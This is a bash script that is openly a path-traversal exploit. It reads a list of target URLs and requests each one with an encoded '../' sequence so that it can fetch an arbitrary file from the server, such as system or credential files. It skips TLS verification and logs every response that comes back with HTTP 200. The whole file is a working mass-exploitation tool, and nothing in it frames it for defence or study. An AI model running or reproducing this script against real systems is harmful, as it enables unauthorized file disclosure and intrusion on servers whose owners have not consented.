#!/bin/bash

# Disable warning
export CURL_SSL_BACKEND=openssl

# Function to exploit
execute_exploit() {
    local full_url=$1
    local file_path=$2
    local output_file=$3
    local encoded_path=$(echo "$file_path" | sed 's/\//%2F/g')
    local constructed_url="$full_url/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..$encoded_path"

    # Make the GET request
    response=$(curl -s -w "%{http_code}" -k "$constructed_url")
    
    # Extract the HTTP status code (last three characters of the response)
    http_status="${response: -3}"
    
    # Extract the content of the response (all but the last three characters)
    response_content="${response:0:${#response}-3}"

    # Check if the request was successful
    if [ "$http_status" -eq 200 ]; then
        echo "Request to $full_url was successful!!!!" | tee -a "$output_file"
        echo "Response content:" | tee -a "$output_file"
        echo "$response_content" | tee -a "$output_file"
    else
        echo "Target $full_url might not be vulnerable..." | tee -a "$output_file"
        echo | tee -a "$output_file"
    fi
}

# Main function
main() {
    if [ "$#" -ne 6 ]; then
        echo "Usage: $0 -u url_list_file -f file_path -o output_file"
        exit 1
    fi

    while getopts "u:f:o:" opt; do
        case $opt in
            u) url_list_file=$OPTARG ;;
            f) file_path=$OPTARG ;;
            o) output_file=$OPTARG ;;
            *) echo "Usage: $0 -u url_list_file -f file_path -o output_file"
               exit 1 ;;
        esac
    done

    # Read URLs from the file and process each
    while IFS= read -r url; do
        execute_exploit "$url" "$file_path" "$output_file"
    done < "$url_list_file"
}

main "$@"
